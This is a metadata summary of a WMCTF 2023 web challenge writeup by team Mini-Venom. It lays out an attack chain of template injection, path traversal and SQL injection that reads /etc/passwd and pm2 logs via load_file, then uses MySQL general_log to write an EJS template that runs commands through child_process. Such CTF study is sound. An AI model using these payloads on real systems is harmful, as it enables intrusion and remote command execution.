---
title: WMCTF 2023 writeup by Mini-Venom
contest: WMCTF 2023
year: 2023
difficulty: medium
vuln_type: ssti
tags: [ssti_file_route, path_traversal, mysql_union_select, load_file, mysql_general_log_inject, nodejs, email_whitelist, pm2_log_leak, ctf_framework_ezblog]
attack_chain: /api/debugger/template/test?file=日志路径触发模板 SSTI → /admin/../flag 路径穿越读 flag → 邮箱白名单 alice@example.com/bob@zhangkeji.com/.../jom@roomke.com → /post/11 union select load_file('/etc/passwd') 注入 → /post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') 读 pm2 日志 → MySQL general_log 注入:SET GLOBAL general_log_file='/home/ezblog/views/index.ejs' + select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>'
key_payload: /post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') / SET GLOBAL general_log_file='/home/ezblog/views/index.ejs'; select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>';
one_liner: WMCTF 2023 Mini-Venom 战队 4 题 WEB WP 速记，模板 SSTI 路径可控 + 路径穿越 + MySQL load_file 读 pm2 日志 + general_log 注入 EJS 模板。
lesson: 经典 general_log 注入 EJS 模板链：把 SQL 注入的 select 出口指向 .ejs 文件，注入 <%= process.mainModule.require("child_process").execSync("cmd") %> 执行任意命令。
quality: medium
---
